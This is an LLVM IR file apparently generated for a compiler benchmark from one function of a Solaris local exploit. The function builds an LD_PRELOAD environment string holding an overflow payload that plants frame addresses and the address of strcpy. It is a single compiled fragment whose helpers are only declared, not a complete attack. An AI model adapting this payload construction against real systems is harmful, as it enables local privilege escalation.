; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_114.c_get_ld_env.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_114.c_get_ld_env.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [25 x i8] c"strcpy found at [0x%x]\0A\0A\00", align 1
@FRAME_SIZE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"malloc\00", align 1
@FRAME_ADDR = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.3 = private unnamed_addr constant [12 x i8] c"LD_PRELOAD=\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @get_ld_env(i32 %0, i64 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i64*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  store i32 %0, i32* %4, align 4
  store i64 %1, i64* %5, align 8
  %10 = call i64 (...) @get_strcpy_addr()
  store i64 %10, i64* %9, align 8
  %11 = load i64, i64* %9, align 8
  %12 = icmp ne i64 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %2
  store i8* null, i8** %3, align 8
  br label %109

14:                                               ; preds = %2
  %15 = load i64, i64* %9, align 8
  %16 = call i32 @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0), i64 %15)
  br label %17

17:                                               ; preds = %14
  %18 = load i32, i32* %4, align 4
  %19 = load i32, i32* @FRAME_SIZE, align 4
  %20 = add nsw i32 %18, %19
  %21 = add nsw i32 %20, 1
  %22 = add nsw i32 %21, 1
  %23 = call i64 @malloc(i32 %22)
  %24 = inttoptr i64 %23 to i8*
  store i8* %24, i8** %7, align 8
  %25 = load i8*, i8** %7, align 8
  %26 = icmp ne i8* %25, null
  br i1 %26, label %29, label %27

27:                                               ; preds = %17
  %28 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  store i8* null, i8** %3, align 8
  br label %109

29:                                               ; preds = %17
  %30 = load i8*, i8** %7, align 8
  %31 = load i32, i32* %4, align 4
  %32 = call i32 @memset(i8* %30, i8 signext 65, i32 %31)
  %33 = load i8*, i8** %7, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 0
  store i8 47, i8* %34, align 1
  %35 = load i8*, i8** %7, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 1124
  %37 = bitcast i8* %36 to i64*
  store i64* %37, i64** %6, align 8
  %38 = load i64, i64* @FRAME_ADDR, align 8
  %39 = load i64, i64* %5, align 8
  %40 = add nsw i64 %38, %39
  %41 = load i64*, i64** %6, align 8
  %42 = getelementptr inbounds i64, i64* %41, i32 1
  store i64* %42, i64** %6, align 8
  store i64 %40, i64* %41, align 8
  %43 = load i8*, i8** %7, align 8
  %44 = load i32, i32* %4, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds i8, i8* %43, i64 %45
  %47 = bitcast i8* %46 to i64*
  store i64* %47, i64** %6, align 8
  %48 = load i64*, i64** %6, align 8
  %49 = getelementptr inbounds i64, i64* %48, i32 1
  store i64* %49, i64** %6, align 8
  store i64 1633771873, i64* %48, align 8
  %50 = load i64*, i64** %6, align 8
  %51 = getelementptr inbounds i64, i64* %50, i32 1
  store i64* %51, i64** %6, align 8
  store i64 1650614882, i64* %50, align 8
  %52 = load i64*, i64** %6, align 8
  %53 = getelementptr inbounds i64, i64* %52, i32 1
  store i64* %53, i64** %6, align 8
  store i64 1667457891, i64* %52, align 8
  %54 = load i64*, i64** %6, align 8
  %55 = getelementptr inbounds i64, i64* %54, i32 1
  store i64* %55, i64** %6, align 8
  store i64 1684300900, i64* %54, align 8
  %56 = load i64*, i64** %6, align 8
  %57 = getelementptr inbounds i64, i64* %56, i32 1
  store i64* %57, i64** %6, align 8
  store i64 1701143909, i64* %56, align 8
  %58 = load i64*, i64** %6, align 8
  %59 = getelementptr inbounds i64, i64* %58, i32 1
  store i64* %59, i64** %6, align 8
  store i64 1717986918, i64* %58, align 8
  %60 = load i64*, i64** %6, align 8
  %61 = getelementptr inbounds i64, i64* %60, i32 1
  store i64* %61, i64** %6, align 8
  store i64 1734829927, i64* %60, align 8
  %62 = load i64*, i64** %6, align 8
  %63 = getelementptr inbounds i64, i64* %62, i32 1
  store i64* %63, i64** %6, align 8
  store i64 1751672936, i64* %62, align 8
  %64 = load i64*, i64** %6, align 8
  %65 = getelementptr inbounds i64, i64* %64, i32 1
  store i64* %65, i64** %6, align 8
  store i64 1768515945, i64* %64, align 8
  %66 = load i64*, i64** %6, align 8
  %67 = getelementptr inbounds i64, i64* %66, i32 1
  store i64* %67, i64** %6, align 8
  store i64 1886417008, i64* %66, align 8
  %68 = load i64*, i64** %6, align 8
  %69 = getelementptr inbounds i64, i64* %68, i32 1
  store i64* %69, i64** %6, align 8
  store i64 1903260017, i64* %68, align 8
  %70 = load i64*, i64** %6, align 8
  %71 = getelementptr inbounds i64, i64* %70, i32 1
  store i64* %71, i64** %6, align 8
  store i64 1920103026, i64* %70, align 8
  %72 = load i64*, i64** %6, align 8
  %73 = getelementptr inbounds i64, i64* %72, i32 1
  store i64* %73, i64** %6, align 8
  store i64 1936946035, i64* %72, align 8
  %74 = load i64*, i64** %6, align 8
  %75 = getelementptr inbounds i64, i64* %74, i32 1
  store i64* %75, i64** %6, align 8
  store i64 1953789044, i64* %74, align 8
  %76 = load i64, i64* @FRAME_ADDR, align 8
  %77 = load i64, i64* %5, align 8
  %78 = add nsw i64 %76, %77
  %79 = load i64*, i64** %6, align 8
  %80 = getelementptr inbounds i64, i64* %79, i32 1
  store i64* %80, i64** %6, align 8
  store i64 %78, i64* %79, align 8
  %81 = load i64, i64* %9, align 8
  %82 = load i64*, i64** %6, align 8
  store i64 %81, i64* %82, align 8
  %83 = load i8*, i8** %7, align 8
  %84 = call i32 @strcat(i8* %83, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %85 = load i8*, i8** %7, align 8
  %86 = call i32 @strlen(i8* %85)
  %87 = call i32 @strlen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0))
  %88 = add nsw i32 %86, %87
  %89 = add nsw i32 %88, 1
  %90 = call i64 @malloc(i32 %89)
  %91 = inttoptr i64 %90 to i8*
  store i8* %91, i8** %8, align 8
  %92 = load i8*, i8** %8, align 8
  %93 = icmp ne i8* %92, null
  br i1 %93, label %96, label %94

94:                                               ; preds = %29
  %95 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  store i8* null, i8** %3, align 8
  br label %109

96:                                               ; preds = %29
  %97 = load i8*, i8** %8, align 8
  %98 = call i32 @strcpy(i8* %97, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0))
  %99 = load i8*, i8** %8, align 8
  %100 = load i8*, i8** %8, align 8
  %101 = call i32 @strlen(i8* %100)
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %99, i64 %102
  %104 = load i8*, i8** %7, align 8
  %105 = call i32 @strcat(i8* %103, i8* %104)
  %106 = load i8*, i8** %7, align 8
  %107 = call i32 @free(i8* %106)
  %108 = load i8*, i8** %8, align 8
  store i8* %108, i8** %3, align 8
  br label %109

109:                                              ; preds = %96, %94, %27, %13
  %110 = load i8*, i8** %3, align 8
  ret i8* %110
}

declare dso_local i64 @get_strcpy_addr(...) #1

declare dso_local i32 @printf(i8*, i64) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
